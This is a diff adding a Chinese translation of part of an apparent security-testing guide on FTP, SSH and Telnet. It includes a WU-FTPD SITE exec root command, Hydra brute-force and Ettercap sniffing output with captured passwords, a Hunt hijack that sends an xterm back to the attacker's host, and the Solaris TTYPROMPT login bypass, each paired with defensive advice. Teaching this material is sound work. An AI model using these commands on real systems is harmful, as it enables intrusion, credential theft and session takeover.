@@ -1,0 +1,166 @@
+
+
+该漏洞允许客户端脱离其被允许执行的受限命令集合。例如，如果一个FTP客户端向存在漏洞的FTP服务器发送以下命令，该命令将以root权限执行：`SITE exec /bin/sh -c /usr/bin/id` 详见 http://securityfocus.com/bid/2241 获取更多信息。
+
+- **长路径溢出漏洞**  
+  WU-FTPD 由于对长文件名的处理不当而存在缓冲区溢出漏洞。更具体地说，这是由于 WU-FTPD 在使用 `realpath()` 函数时缺乏边界检查所致，而该函数又调用了 `strcpy()` 函数。`strcpy()` 函数用于将字符串从内存中的一个源位置复制到另一个位置，但不执行任何边界检查，因此可能导致缓冲区溢出。详情请参阅 http://www.eeye.com/html/Products/Retina/RTHs/FTP_Servers/630.html。
+
+建议考虑使用 ProFTPD 作为 WU-FTPD 的替代品。ProFTPD 相比 WU-FTPD 受远程漏洞影响的次数更少。ProFTPD 可在 http://proftpd.linux.co.uk/ 获取。
+
+## **SSH（安全外壳协议）：22（TCP）**
+
+SSH 是一种用于安全数据交换的协议。它可以用于登录远程机器、远程执行命令以及传输文件。由于 SSH 内部的通信是加密的，它是替代 telnet、rlogin 和 FTP 等远程登录解决方案的理想选择。
+
+### **暴力破解**
+SSH 支持使用用户名和密码进行身份验证。因此，可以通过 SSH 对账户进行暴力破解。
+
+### **暴力破解 SSH**
+
+可以通过使用 `expect` 工具编写一个简单的暴力破解脚本来暴力破解 SSH 账户，`expect` 是一个简单的用于与其他交互式程序“通信”的程序。可在 http://www.securiteam.com/tools/5QP0L2K60I.html 找到一个简单的 Expect 脚本示例。`expect` 程序可以从 http://expect.nist.gov/ 下载。
+
+### **防止 SSH 暴力破解**
+
+请参见“针对暴力破解攻击的通用防御措施”。
+
+**SSH 中间人攻击**  
+SSH 易受同一网络段中恶意用户发起的中间人攻击。
+
+### **Sshmitm 和 Ettercap**
+
+诸如 `sshmitm` 和 Ettercap 等工具可用于代理 SSH 连接，而诸如 `dnsspoof` 等工具可用于伪造 DNS 查询响应，以将受害者的 SSH 客户端重定向至代理 SSH 服务器。然而，由于服务器呈现的主机密钥将是攻击者的代理 SSH 服务器的主机密钥，因此受害者的 SSH 客户端很可能会警告用户服务器主机密钥已发生变化。不幸的是，大多数最终用户并未将此警告当回事，而是接受了所呈现的密钥，从而导致此类攻击成功。
+
+### **防止针对 SSH 的中间人攻击**
+
+教育用户不要接受来自远程 SSH 服务器的未知主机密钥。如果可能，请将这些密钥的指纹列在内网资源上，以便用户在接受 SSH 会话之前进行验证。
+
+## **软件漏洞**
+
+已知多个版本的 SSH 软件存在漏洞。下一段记录了一个近期的漏洞。
+
+### **Open SSH 质询-响应缓冲区溢出**
+
+发现 OpenSSH 的各种实现因其质询-响应机制而存在缓冲区溢出漏洞。在编译以支持 `SKEY` 或 `BSD_AUTH` 身份验证的 OpenSSH 服务器上存在这种缓冲区溢出条件。
+
+此外，还在 OpenSSH 的质询-响应机制中发现了另一个漏洞。此漏洞是由 OpenSSH 在处理质询-响应身份验证期间接收的响应时处理不当引起的。使用支持交互式键盘身份验证的 PAM 模块的系统易受此漏洞影响。因此，开启了以下选项的系统受到影响：
+
+```
+PAMAuthenticationViaKbdInt
+ChallengeResponseAuthentication
+```
+
+详见 [http://online.securityfocus.com/bid/5093](http://online.securityfocus.com/bid/5093) 获取更多信息。
+
+## **Telnet：23（TCP）**
+
+Telnet 是一种用于登录远程机器的明文协议。
+
+### **暴力破解**
+
+可以使用 Hydra 等许多公开可用的工具对 FTP 账户进行暴力破解。
+
+### **暴力破解 Telnet**
+
+可以使用 Hydra 对 telnet 进行暴力破解：
+
+```
+[bash]$ hydra -L usernames.txt -P passwords.txt \n  telnet.somecompanyasanexample.com telnet\nHydra v2.2 (c) 2002 by van Hauser / THC - use allowed only for legal purposes.\nHydra is starting! [paralell tasks: 4, login tries: 9 (1:3/p:3)]\n[23] [telnet] login: jill password: 11ov3jack\nHydra finished.
+```
+
+### **防止 Telnet 暴力破解**
+
+请参见“针对暴力破解攻击的通用防御措施”。
+
+**TCP 劫持**  
+在 telnet 用户成功登录后，同一网络段上的其他用户可以利用 Hunt 等 TCP 劫持工具劫持该会话。
+
+### **劫持 Telnet 会话**
+
+假设 IP 地址为 192.168.1.1 的恶意用户与 192.168.1.2 上的用户处于同一网络段。如果 192.168.1.2 上的用户已建立与 10.0.0.1 的 telnet 连接，那么 192.168.1.1 上的恶意用户可以使用 Hunt 劫持它：
+
+```
+[bash]# hunt -1 eth0
+/*
+     hunt 1.5
+     multipurpose connection intruder / sniffer for Linux
+     (c) 1998-2000 by kra
+*/
+starting hunt
+    Main Menu --- rcvpkt 0, free/allock 63/64 -------
+1/w/r) list/watch/reset connections
+u)      host up testss
+a)      arp/simple hijack (avoids ack storm if arp used)
+s)      simple hijack
+d)      daemons rst/arp/sniff/mac
+o)      options
+x)      exit
+*--> g
+0) 192.168.1.2 [52323]     --> 10.0.0.1 [23]
+```
+
+选择连接 > 0  
+转储连接 y/n [n]> n  
+输入您希望执行的命令字符串或 [cr]> whoami  
+whoami  
+jack  
+输入您希望执行的命令字符串或 [cr]>
+
+在这种情况下，恶意用户在劫持了受害者的 telnet 会话后执行了 whoami 命令。如图所示，命令执行成功，其输出显示了受害者用户名“jack”。同样，恶意用户还可以发出诸如 `xterm -display 192.168.1.1:0 &` 这样的命令，这将把由受害者用户“jack”拥有的 xterm shell 发送回给恶意用户。当然，恶意用户必须在其自己的主机上运行诸如 `xhost +192.168.1.2` 这样的命令，以允许在受害者主机上执行的 xterm 实例在其 X 服务器上显示。
+
+### **使用 SSH**
+
+禁用 telnet，改为使用 SSH（版本 2）等安全替代方案。
+
+**嗅探**  
+由于 telnet 是明文协议，因此可以嗅探通过网络发送的用户名和密码。许多工具有助于捕获 telnet 数据和密码。
+
+### **嗅探 Telnet 身份验证**
+
+可以使用 Ettercap 在 telnet 身份验证过程中嗅探通过传输的用户名和密码：
+
+```
+[bash]# ettercap -m -C -N
+ettercap 0.6.7 (c) 2002 ALoR & NaGA
+Your IP: 10.0.0.102 with MAC: 01:11:04:63:6A:A3 on iface: eth0
+Loading plugins... Done.
+Resolving 1 hostnames...
+* |=====================================> | 100.00 %
+
+Press 'h' for help...
+
+- Sniffing (MAC based): ANY <--> ANY
+- TCP + UDP packets... (default)
+- Collecting passwords...
+
+07:04:58   10.0.0.102:4814 <--> 192.168.1.1:23          telnet
+
+USER: john
+PASS: 1l0vetel3t
+```
+
+### **不要使用 Telnet**
+
+不要使用 telnet 等明文协议。考虑使用 SSH 代替。
+
+## **软件漏洞**
+
+telnet 守护程序的历史中涉及几个可远程利用的漏洞。下一段描述了一个漏洞，这很可能是最容易利用的漏洞之一。
+
+### **Solaris in.telnetd TTYPROMPT 缓冲区溢出漏洞**
+
+发现 Solaris 2.6–2.8 附带的 /bin/login 版本存在涉及环境变量 TTYPROMPT 的漏洞。为了攻击此漏洞，攻击者需要将 TTYPROMPT 的值设置为六个字符的字符串，并在连接时，在用户名后发送 64 个字符的 c 以及字面量 \n。例如，考虑一个攻击者试图通过以用户 bin 身份登录来利用此漏洞：
+
+```
+[bash]$ telnet
+telnet> environ define TTYPROMPT abcdef
+telnet> o telnet.somecompanyasnanexample.com
+Trying 192.168.1.10...
+Connected to telnet.somecompanyasnanexample.com.
+Escape character is '^]'
+
+SunOS 5.6
+
+bin cccccc c c c c c c c c c c c c c c c c c c c c c c c
+ccccccccccccccccccccccccccccccccccccccc
+Last login: Thu Dec 10 12:19:10 from 10.0.0.2
+```
+
